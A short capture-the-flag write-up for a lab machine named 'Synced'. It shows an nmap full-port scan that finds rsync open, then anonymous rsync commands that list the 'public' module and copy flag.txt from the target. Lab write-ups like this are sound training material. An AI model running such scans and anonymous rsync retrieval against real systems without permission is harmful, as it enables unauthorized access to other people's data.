# Synced

- TL;DR: Since the `rsync` is misconfigured to permit anonymous login we are able to connect to the remote server with `rsync` cli and view the contents on the remote server.

## Reconnaissance
    
- Run an nmap scan:
```
nmap -p- --min-rate=1000 -sV 10.129.57.117

Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 20:07 PDT
Nmap scan report for 10.129.57.117
Host is up (0.077s latency).
Not shown: 65534 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.24 seconds

```
<br>

## Exploitation

- From the scan we find the following ports open:
    - `873/tcp` running the `rsync` service.
- `rsync` allows to copy locally, to/from another host over any remote shell, or to/from a remote rsync daemon. 
- We run the following command to list out the directories on the remote host using the `rsync` cli:
    - `rsync --list-only 10.129.57.117`
- Next we list the files inside the directory we got from the previous command:
    - `rsync --list-only 10.129.57.117::public`
- We can then transfer the file from the `public` directory on the remote host to our local machine with the following command:
    - `rsync 10.129.57.117::public/flag.txt flag.txt`
